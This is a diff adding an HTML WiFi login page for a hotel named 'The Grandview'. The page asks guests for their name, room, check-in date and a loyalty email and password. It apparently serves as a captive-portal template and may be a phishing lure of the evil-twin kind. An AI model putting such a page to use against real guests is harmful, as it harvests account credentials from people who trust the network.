@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hotel WiFi Access</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: Georgia, 'Times New Roman', serif;
+    background: linear-gradient(135deg, #1b2a3b 0%, #2d4a6b 100%);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: #fff;
+    width: 100%;
+    max-width: 400px;
+    border-radius: 2px;
+    box-shadow: 0 8px 40px rgba(0,0,0,0.5);
+    overflow: hidden;
+  }
+  .gold-bar { background: #c9a84c; height: 5px; }
+  .header {
+    padding: 30px 28px 20px;
+    text-align: center;
+    border-bottom: 1px solid #eee;
+  }
+  .hotel-name {
+    font-size: 26px;
+    font-weight: normal;
+    color: #1b2a3b;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+  .hotel-tagline {
+    font-size: 12px;
+    color: #c9a84c;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-top: 4px;
+  }
+  .wifi-icon {
+    font-size: 32px;
+    margin: 14px 0 6px;
+    color: #1b2a3b;
+  }
+  h2 {
+    font-size: 15px;
+    color: #555;
+    font-family: Arial, sans-serif;
+    font-weight: normal;
+    margin-top: 4px;
+  }
+  .body { padding: 24px 28px 20px; }
+  .info {
+    background: #f8f6f0;
+    border-left: 3px solid #c9a84c;
+    padding: 10px 14px;
+    font-size: 13px;
+    color: #555;
+    font-family: Arial, sans-serif;
+    margin-bottom: 22px;
+    line-height: 1.5;
+  }
+  label {
+    display: block;
+    font-family: Arial, sans-serif;
+    font-size: 11px;
+    font-weight: bold;
+    color: #888;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 5px;
+  }
+  input[type=text], input[type=password], input[type=email] {
+    width: 100%;
+    padding: 10px 12px;
+    border: 1px solid #ddd;
+    border-radius: 1px;
+    font-size: 14px;
+    font-family: Arial, sans-serif;
+    margin-bottom: 16px;
+    outline: none;
+    color: #333;
+  }
+  input:focus { border-color: #c9a84c; }
+  .row { display: flex; gap: 12px; }
+  .row .field { flex: 1; }
+  .divider {
+    text-align: center;
+    font-family: Arial, sans-serif;
+    font-size: 12px;
+    color: #aaa;
+    margin: 4px 0 16px;
+    position: relative;
+  }
+  .divider::before, .divider::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    width: 40%;
+    height: 1px;
+    background: #eee;
+  }
+  .divider::before { left: 0; }
+  .divider::after { right: 0; }
+  .btn {
+    width: 100%;
+    background: #1b2a3b;
+    color: #fff;
+    border: none;
+    padding: 12px;
+    font-size: 13px;
+    font-family: Arial, sans-serif;
+    font-weight: bold;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    cursor: pointer;
+  }
+  .btn:hover { background: #c9a84c; }
+  .footer {
+    padding: 16px 28px;
+    font-family: Arial, sans-serif;
+    font-size: 11px;
+    color: #999;
+    text-align: center;
+    border-top: 1px solid #eee;
+  }
+  .footer a { color: #c9a84c; text-decoration: none; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="gold-bar"></div>
+  <div class="header">
+    <div class="hotel-name">The Grandview</div>
+    <div class="hotel-tagline">Collection &mdash; Hotels &amp; Resorts</div>
+    <div class="wifi-icon">&#x1F4F6;</div>
+    <h2>Complimentary Guest WiFi</h2>
+  </div>
+  <div class="body">
+    <div class="info">
+      Welcome to The Grandview. Enter your room number and last name as shown on your reservation to connect.
+    </div>
+    <form method="POST" action="/">
+      <label for="lastname">Last Name</label>
+      <input type="text" id="lastname" name="lastname" placeholder="As on your reservation" autocomplete="family-name">
+
+      <div class="row">
+        <div class="field">
+          <label for="room">Room Number</label>
+          <input type="text" id="room" name="room" placeholder="e.g. 412">
+        </div>
+        <div class="field">
+          <label for="checkin">Check-In Date</label>
+          <input type="text" id="checkin" name="checkin" placeholder="MM/DD">
+        </div>
+      </div>
+
+      <div class="divider">or sign in with loyalty account</div>
+
+      <label for="loyalty">Loyalty Number / Email</label>
+      <input type="email" id="loyalty" name="loyalty" placeholder="member@email.com" autocomplete="email">
+
+      <label for="loyaltypin">PIN / Password</label>
+      <input type="password" id="loyaltypin" name="loyaltypin" placeholder="&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;" autocomplete="current-password">
+
+      <button type="submit" class="btn">Connect to WiFi</button>
+    </form>
+  </div>
+  <div class="footer">
+    By connecting you agree to our <a href="#">Terms of Use</a> &bull; <a href="#">Privacy Policy</a><br>
+    For assistance, dial 0 from your room phone.
+  </div>
+</div>
+</body>
+</html>
